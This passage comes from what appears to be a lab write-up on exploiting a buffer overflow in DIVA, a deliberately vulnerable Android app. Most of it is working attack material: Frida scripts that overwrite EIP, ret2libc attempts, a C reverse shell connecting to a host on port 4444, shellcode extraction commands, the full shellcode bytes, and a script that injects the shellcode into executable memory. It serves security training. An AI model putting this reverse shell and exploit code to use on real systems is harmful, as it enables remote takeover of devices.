<br>&nbsp;&nbsp;&nbsp;&nbsp;var SpannableStringBuilder = Java.use("android.text.SpannableStringBuilder");
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpannableStringBuilder.toString.overload().implementation = function () {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var retval = this.toString.call(this);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("[\*] SpannableStringBuilder Return: " + retval);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return '\xe7\x9f\x3e\x66';
<br>&nbsp;&nbsp;&nbsp;&nbsp;};
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(string_with_jni_addr, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onEnter: function (args) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//console.log("Function args: " + args[0], args[1], args[2])
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var testo = Java.vm.getEnv().getStringUtfChars(args[2], null).readCString();
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var utf8 = unescape(encodeURIComponent(testo));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var arr = [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (var i = 0; i < utf8.length; i++) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr.push(utf8.charCodeAt(i).toString(16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(arr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;})
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>YEAH!!! It is true, and we finally found the problem.
<br>We tried to force to return value "u03f7" and it returns cf,b7 like this conversion table which we noticed earlier also, but this time with some proper evidence:
<br>![14-58](https://teckk2.github.io/assets/images/DIVA/14-58.png)
<br>The idea now was to find the exact values that once encoded give us just the bytes of the address we need to write in EIP, unfortunately not all the bytes have a corresponding in UTF8 and so it was another failure.
<br>Now we will try to hook **strcpy**
<br>Digging deeper again, with gdb, we found that inside DivaJni_initiateLaunchSequence another function was called: strcpy
<br>As always we created a Js script to hook this native function and replace return value with our buffer overflow trigger bytes array.
<br>![14-59](https://teckk2.github.io/assets/images/DIVA/14-59.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var stringcopy = Module.findExportByName("libdivajni.so",
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"strcpy")
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpyPtr pointer is: " + stringcopy)
<br>&nbsp;&nbsp;&nbsp;&nbsp;};
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(stringcopy, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onEnter: function(args){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src:" + Memory.readUtf8String (args [1]));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy dest:" + args[0]);
<br>&nbsp;&nbsp;&nbsp;&nbsp;},
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function (retval) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy, retval="+retval);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src=" + Memory.readCString(retval));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;
<br>&nbsp;&nbsp;&nbsp;&nbsp;})
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Not even this attempt has led us to our desired result.
<br>Let’s try now hooking GetStringUTFChars
<br>Digging deeper again, with gdb, we found another function was called: GetStringUTFChars.
<br>This time we found our bad guy and the following Frida error message can confirm that fact:
<p class="message">
  Abort message: 'art/runtime/java_vm_ext.cc:470] JNI DETECTED ERROR IN APPLICATION: GetStringUTFChars received NULL jstring'
</p>
<br>At this point we read about Java.vm.getEnv() and wrote this script that calculate the offset of our function from the functions pointer table. 
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now we done some tests to understand what goes on under the hood
<br>We set some breakpoints and stepping into function, with an eye to stack and register in search of my input.
<br>![14-61](https://teckk2.github.io/assets/images/DIVA/14-61.png)
<br>In the above screenshot we can see that our input in memory is exactly what we send but in this phase It added a 00 byte behind every bytes we send.
<br>We do custom gef layout to watch registers, code, stack, and a particular area of memory where our input resides, with the following commands.
<p class="message">
  gef➤  gef config context.layout "regs code args stack -source -legend -threads -trace extra memory"
  gef➤  memory watch 0x12d0a7d0 0x50 byte
</p>
<br>And the result is:
<br>![14-62](https://teckk2.github.io/assets/images/DIVA/14-62.png)
<br>Step by step we found one bad guy
<br>![14-63](https://teckk2.github.io/assets/images/DIVA/14-63.png)
<br>![14-64](https://teckk2.github.io/assets/images/DIVA/14-64.png)
<br>![14-65](https://teckk2.github.io/assets/images/DIVA/14-65.png)
<br>![14-66](https://teckk2.github.io/assets/images/DIVA/14-66.png)
<br>In the end the real culprit seems to be the function ConvertUtf16ToModifiedUtf8 but we can interact at GetStringUTFChars level.
<br>Finally KNX wrote the hooking script that replace return value of GetStringUTFChars
<br>![14-67](https://teckk2.github.io/assets/images/DIVA/14-67.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-68](https://teckk2.github.io/assets/images/DIVA/14-68.png)
<br>It works!! We finally overwritten EIP with the address we want.
<br>Now one more question arise, can we exploit with ret2libc now?
<br>OK, now that we have complete control over EIP, you have to bypass NX and ASLR. For ASLR there is no problem, Frida has the hook in realtime so she can find us the memory addresses we need, but NX? As always we can bypass it with the ret2libc.
<br>In real Android device we have to do some ROP chain to pop the address of the command to execute to R0, but I am in android studio x86 :)
<br>For more information return to r0 here: [https://blog.attify.com/demystifying-ret2zp/](https://blog.attify.com/demystifying-ret2zp/)
<br>**How to write system address to EIP?**
<br>KNX made this script that takes system address, split it into bytes and add to bytearray. If we insert "bof" in editText and push redbutton, it replace in memory mine byte array and overwrite EIP with system address, Yeah :)
<br>![14-69](https://teckk2.github.io/assets/images/DIVA/14-69.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var system = Module.findExportByName("/system/lib/libc.so", "system");
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] System Address is: " + system);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var ps = system.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Anyway we can’t found a way to exploit ret2libc.
<br>**Another method is Dup2 shellcode**
<br>Ok we can overwrite EIP, ret2libc fails, and now?
<br>Now I try to inject in memory a reverse shell, make memory executable and jump to shellcode.
<br>In our plan the steps we need are:
<br>&nbsp;&nbsp;1. Find reverse shell
<br>&nbsp;&nbsp;2. Cross-Compile it
<br>&nbsp;&nbsp;3. Test it
<br>&nbsp;&nbsp;4. If it works, extract hex bytes
<br>&nbsp;&nbsp;5. Put bytes in executable memory area
<br>&nbsp;&nbsp;6. Overwrite EIP to jump to shellcode
<br>The main challenge was to find a working dup2 shellcode
<br>![14-70](https://teckk2.github.io/assets/images/DIVA/14-70.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>#include <stdio.h>
<br>#include <unistd.h>
<br>#include <netinet/in.h>
<br>#include <sys/types.h>
<br>#include <sys/socket.h>
<br>
<br>#define REMOTE_ADDR "192.168.1.193"
<br>#define REMOTE_PORT 4444
<br>
<br>int main(int argc, char \*argv[])
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;struct sockaddr_in sa;
<br>&nbsp;&nbsp;&nbsp;&nbsp;int s;
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;sa.sin_family = AF_INET;
<br>&nbsp;&nbsp;&nbsp;&nbsp;sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
<br>&nbsp;&nbsp;&nbsp;&nbsp;sa.sin_port = htons(REMOTE_PORT);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;s = socket(AF_INET, SOCK_STREAM, 0);
<br>&nbsp;&nbsp;&nbsp;&nbsp;connect(s, (struct sockaddr *)&sa, sizeof(sa));
<br>&nbsp;&nbsp;&nbsp;&nbsp;dup2(s, 0);
<br>&nbsp;&nbsp;&nbsp;&nbsp;dup2(s, 1);
<br>&nbsp;&nbsp;&nbsp;&nbsp;dup2(s, 2);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;execve("system/bin/sh", 0, 0);
<br>&nbsp;&nbsp;&nbsp;&nbsp;return 0;
<br>}
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now Cross-compile it with gcc-multilib
<br>We have to install gcc multilib package to cross compiler
<p class="message">
  apt-get install gcc-multilib
</p>
<br>Then we need to compile it statically (to avoid the issue to missing library to android)
<p class="message">
  gcc -m32 test.c -o test -static
</p>
<br>![14-71](https://teckk2.github.io/assets/images/DIVA/14-71.png)
<br>It works!
<br>Now extract HexBytes shellcode
<p class="message">
  objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
</p>
<br>Oh shit! Static compilation generated a very very large shellcode, 1.6 MB.
<br>We need to find a way to cross-compiling dynamic binary.
<br>**Cross Compiling C/C++ for Android**
<br>We followed this post: [http://nickdesaulniers.github.io/blog/2016/07/01/android-cli/](http://nickdesaulniers.github.io/blog/2016/07/01/android-cli/)
<br>Download Android NDK
<p class="message">
  curl -O http://dl.google.com/android/repository/android-ndk-r12b-linux-x86_64.zip
</p>
<br>Unzip it
<p class="message">
  unzip android-ndk-r12b-linux-x86_64.zip
</p>
<br>Install adb and fastboot (if they are not already installed)
<p class="message">
  sudo apt-get install android-tools-adb android-tools-fastboot
</p>
<br>Create Android toolchain for my architecture (x86)
<p class="message">
  ./android-ndk-r12b/build/tools/make_standalone_toolchain.py --arch x86 --install-dir x86/
</p>
<p class="message">
  PATH=$PATH:/x86 #adjust to your install-dir
</p>
<br>**Testing it**
<p class="message">
  <br>cd /x86/bin
  <br>./clang test.c -pie -o test
</p>
<p class="message">
  <br>root@GroundZero:~/Test_DIVA# file test
  <br>test: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
  <br>dynamically linked, interpreter /system/bin/linker, not stripped
</p>
<br>Yeah! Now test reverse shell
<br>![14-72](https://teckk2.github.io/assets/images/DIVA/14-72.png)
<br>The generated binary is 4,4K And it works!!
<p class="message">
  objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' > hexdump.txt
</p>
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>root@GroundZero:~/Test_DIVA# cat hexdump.txt 
<br>"\xff\xb3\x04\x00\x00\x00\xff\xa3\x08\x00\x00\x00\x00\x00\xff\xa3\x0c\x00\x00\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\xa3\x10\x00\x00\x00\x68\x08\x00\x00\x00\xe9\xd0\xff\xff\xff\xff\xa3\x14\x00\x00\x00\x68\x10\x00\x00\x00\xe9\xc0\xff\xff\xff\xff\xa3\x18\x00\x00\x00\x68\x18\x00\x00\x00\xe9\xb0\xff\xff\xff\xff\xa3\x1c\x00\x00\x00\x68\x20\x00\x00\x00\xe9\xa0\xff\xff\xff\xff\xa3\x20\x00\x00\x00\x68\x28\x00\x00\x00\xe9\x90\xff\xff\xff\xff\xa3\x24\x00\x00\x00\x68\x30\x00\x00\x00\xe9\x80\xff\xff\xff\xff\xa3\x28\x00\x00\x00\x68\x38\x00\x00\x00\xe9\x70\xff\xff\xff\x8d\x64\x24\xf4\x8b\x44\x24\x10\x85\xc0\x74\x02\xff\xd0\x8d\x64\x24\x0c\xc3\x8d\xb6\x00\x00\x00\x00\x8d\xbc\x27\x00\x00\x00\x55\x89\xe5\x53\xe8\xb2\x00\x00\x00\x81\xc3\x0f\x14\x00\x00\x83\xe4\xf0\x8d\x64\x24\xe0\x8d\x83\x3c\x00\x00\x00\xc7\x44\x24\x04\x00\x00\x00\x89\x44\x24\x14\x8d\x83\x34\x00\x00\x00\x89\x44\x24\x18\x8d\x83\x2c\x00\x00\x00\x89\x44\x24\x1c\x8d\x44\x24\x14\x89\x44\x24\x0c\x8d\x83\xa8\xec\xff\xff\x89\x44\x24\x08\x8d\x45\x04\x89\x04\x24\xe8\x07\xff\xff\xff\x8d\xb4\x26\x00\x00\x00\x53\xe8\x55\x00\x00\x00\x81\xc3\xb2\x13\x00\x00\x8d\x64\x24\xe8\x8d\x83\x44\x00\x00\x00\x89\x44\x24\x08\x8b\x44\x24\x20\x89\x44\x24\x04\x8d\x83\xc8\xeb\xff\xff\x89\x04\x24\xe8\xe0\xfe\xff\xff\x8d\x64\x24\x18\x5b\xc3\x8d\x76\x00\x8d\xbc\x27\x00\x00\x00\x53\xe8\x15\x00\x00\x00\x81\xc3\x72\x13\x00\x00\x8d\x64\x24\xf8\xe8\xcb\xfe\xff\xff\x8d\x64\x24\x08\x5b\xc3\x8b\x1c\x24\xc3\x90\x55\x89\xe5\x53\x56\x83\xec\x70\xe8\x00\x00\x00\x00\x58\x81\xc0\x4b\x13\x00\x00\x8b\x4d\x0c\x8b\x55\x08\x8d\xb0\x00\xee\xff\xff\xc7\x45\xf4\x00\x00\x00\x89\x55\xf0\x89\x4d\xec\x66\xc7\x45\xd8\x02\x00\x89\x34\x24\x89\xc3\x89\x45\xd0\xe8\x90\xfe\xff\xff\xb9\x02\x00\x00\x00\xba\x01\x00\x00\x00\x31\xf6\x89\x45\xdc\x66\xc7\x45\xda\x11\x5c\xc7\x04\x24\x02\x00\x00\xc7\x44\x24\x04\x01\x00\x00\xc7\x44\x24\x08\x00\x00\x00\x8b\x5d\xd0\x89\x75\xcc\x89\x4d\xc8\x89\x55\xc4\xe8\x63\xfe\xff\xff\xb9\x10\x00\x00\x00\x8d\x55\xd8\x89\x45\xd4\x8b\x45\xd4\x89\x04\x24\x89\x54\x24\x04\xc7\x44\x24\x08\x10\x00\x00\x8b\x5d\xd0\x89\x4d\xc0\xe8\x4b\xfe\xff\xff\x31\xc9\x8b\x55\xd4\x89\x14\x24\xc7\x44\x24\x04\x00\x00\x00\x8b\x5d\xd0\x89\x45\xbc\x89\x4d\xb8\xe8\x3d\xfe\xff\xff\xb9\x01\x00\x00\x00\x8b\x55\xd4\x89\x14\x24\xc7\x44\x24\x04\x01\x00\x00\x8b\x5d\xd0\x89\x45\xb4\x89\x4d\xb0\xe8\x1c\xfe\xff\xff\xb9\x02\x00\x00\x00\x8b\x55\xd4\x89\x14\x24\xc7\x44\x24\x04\x02\x00\x00\x8b\x5d\xd0\x89\x45\xac\x89\x4d\xa8\xe8\xfb\xfd\xff\xff\x8b\x4d\xd0\x8d\x91\x0e\xee\xff\xff\x31\xf6\x89\x14\x24\xc7\x44\x24\x04\x00\x00\x00\xc7\x44\x24\x08\x00\x00\x00\x89\xcb\x89\x45\xa4\x89\x75\xa0\xe8\xe0\xfd\xff\xff\x31\xc9\x89\x45\x9c\x89\xc8\x83\xc4\x70\x5e\x5b\x5d\xc3"
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>This time it is more friendly :)
<br>Now we will put bytes in executable memory area (or make it executable)
<br>I done it but we have 2 issues.
<br>![14-73](https://teckk2.github.io/assets/images/DIVA/14-73.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(1024);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0xff, 0xb3, 0x04, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x0c, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0xe9, 0xe0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x10, 0x00, 0x00, 0x00, 0x68, 0x08, 0x00, 0x00, 0x00, 0xe9, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x14, 0>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16), 0xCC);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 1024, 'rwx');
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 1024}));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>In this case we created 2 memory areas, one for our buffer overflow trigger (A*32 + RET) and other for shellcode.
<br>Yes, we also make executable the shellcode area, and Yes all math operation is right, but it doesn’t work.
<br>Why? Because when we replace our input with our bof trigger, the function GetStringUtfChars exit, and immediately call ReleaseGetStringUtfChars that free the shellcode memory area. The result is when EIP try to jump to shellcode, it lead to a junk memory area.
<br>We tried a second way, we put shellcode immediately after RET in my buffer trigger string, but unfortunately the buffer is too small.
<br>Now put shellcode in a static memory area
<br>Finally we choose to overwrite an already exists memory area instead use heap.
